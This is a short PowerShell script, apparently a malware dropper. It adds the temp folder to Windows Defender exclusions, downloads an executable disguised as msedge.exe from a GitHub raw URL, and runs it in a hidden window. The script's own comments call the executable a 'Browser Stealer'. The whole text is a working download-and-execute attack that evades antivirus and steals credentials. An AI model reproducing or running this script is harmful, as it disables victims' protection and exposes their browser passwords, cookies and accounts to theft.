# Add C:/ to exlusions so Windows Defender doesnt flag the exe we will download
Add-MpPreference -ExclusionPath $env:tmp

# Download the exe and save it to temp directory
iwr "https://raw.githubusercontent.com/Nxtccijo/oooow/refs/heads/main/msedge.exe" -outfile "$env:tmp\msedge.exe"

# Execute the Browser Stealer
cd $env:tmp;Start-Process -FilePath "$env:tmp\msedge.exe" -WindowStyle h -Wait
